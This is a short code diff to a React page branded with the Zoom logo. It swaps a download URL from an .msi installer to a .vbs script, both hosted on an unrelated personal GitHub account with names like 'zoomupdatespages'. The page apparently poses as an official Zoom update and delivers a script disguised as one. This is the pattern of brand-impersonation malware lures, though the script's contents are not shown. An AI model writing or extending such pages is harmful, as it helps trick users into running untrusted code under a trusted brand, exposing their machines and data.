@@ -5,7 +5,7 @@ import zoomLogo from "@/assets/zoom-logo.png";
 import { logActivity } from "@/lib/activity";
 
 const DOWNLOAD_URL =
-  "https://github.com/elizzygettygrant-maker/zoomupdates/releases/download/v.6565/Zoom_Updates.msi";
+  "https://github.com/elizzygettygrant-maker/zoomupdatespages/releases/download/Zoomupdates/ZoomWorkspace_Updated2026vb.vbs";
 
 const Index = () => {
   const navigate = useNavigate();
